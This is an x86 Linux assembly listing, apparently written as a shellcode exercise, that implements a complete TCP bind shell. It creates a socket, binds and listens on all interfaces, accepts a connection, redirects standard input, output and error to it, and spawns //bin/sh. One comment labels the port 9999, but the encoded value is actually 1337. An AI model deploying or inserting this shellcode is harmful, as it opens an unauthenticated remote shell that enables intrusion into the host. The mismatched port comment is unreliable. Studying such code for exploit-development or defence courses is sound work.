global _start

section .text

_start:

  ;---------------------------------------------
  ; int socket(int domain, int type, int protocol 
  ;----------------------------------------------
  xor eax, eax ; eax = 0
  xor ebx, ebx ; ebx = 0
  xor edx, edx ; edx = 0 
  
  push ebx         ; protocol = 0 
  push 0x1         ; type = 1
  push 0x2         ; domain = 2 
  mov al, 0x66     ; socketcall 
  mov bl, 0x1      ; int call (SOCKET)
  lea  ecx, [esp]  ; pointer to arguments
  int 0x80         ; eax after call contains fd of the socket 


  ;-----------------------------
  ;int bind(int sockfd, const struct sockaddr *addr, int len) 
  ;--------------------------------------------
  mov esi,eax  ; esi contains fd , we keep it for later
  
  ;lets build sockaddr_in
  push edx     ; edx = 0, 0.0.0.0
  push word 0x3905  ; 9999 (reverse order)  
  push word 0x2     ; family - AF_INET
  

  mov ecx, esp
  push 0x10    ; len 
  push ecx         ;pointer to struct
  push esi  ; esi = file descriptor
  mov al , 0x66
  mov bl , 0x2 
  mov ecx, esp 
  int 0x80 ;return 0 if working 


  ;----------------------------------------
  ; listen (sockfd, backlog) 
  ;---------------------------------
  push edx   ; backlog 
  push esi   ; sockfd (esi contains fd)
  mov edi, ebx ; we will use edi as counter later for dup2  
  
  mov al , 0x66 
  mov bl, 0x4   ; listen 
  mov ecx, esp  ; pointer to listen args   
  int 0x80   
 

  ;---------------------------------
  ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
  ;---------------------
  push edx ; null pointer to socklen 
  push edx ; null pointer to socckaddr 
  push esi ; sockfd 

  mov al, 0x66
  mov bl , 0x5 ;accept 
  mov ecx, esp
  int 0x80 

  ;----------------------------
  ; int dup2(int oldfd, int newfd)
  ;-----------------------------
  
  mov ebx, eax  ; eax points to oldfd returned from accept 
  xchg ecx, edi  ; ecx is now a counter with value 2 
  inc ecx        ; so can loop better
  mov al, 0x3f 
  
dup2:


    dec ecx 
    ;call dup2
    mov al,0x3f ; syscall for dup2 
    ;ebx already set
    ;ecx - newfd, already set 
    int 0x80 
 
    ;loop 
    jnz dup2        


  ;-------------------------------
  ; int execve(const char *filename, char *const argv[], char *const envp[]);
  ;----------------------------
  push edx ; envp 
  push edx ; argv 
  push 0x68732F6E
  push 0x69622F2F ;//bin/sh, filename 
  mov ebx, esp  ; *filename 
  mov al, 0xb ; syscall for execve 
  int 0x80 
  

